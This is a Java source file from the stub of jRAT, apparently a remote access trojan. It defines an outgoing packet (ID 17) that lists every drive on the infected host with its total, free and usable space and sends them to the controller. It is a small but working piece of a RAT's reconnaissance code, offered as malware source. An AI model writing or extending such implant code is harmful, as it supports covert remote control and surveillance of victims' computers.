package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;
import java.io.DataOutputStream;
import java.io.File;


public class Packet17InitDrives extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		File[] drives = File.listRoots();
		
		dos.writeInt(drives.length);
		
		for (File drive : drives) {
			sw.writeLine(drive.getAbsolutePath());
			dos.writeShort((int) (drive.getTotalSpace() / 1024L / 1024L / 1024L));
			dos.writeShort((int) (drive.getFreeSpace() / 1024L / 1024L / 1024L));
			dos.writeShort((int) (drive.getUsableSpace() / 1024L / 1024L / 1024L));
		}
	}

	@Override
	public short getPacketId() {
		return (byte) 17;
	}

}
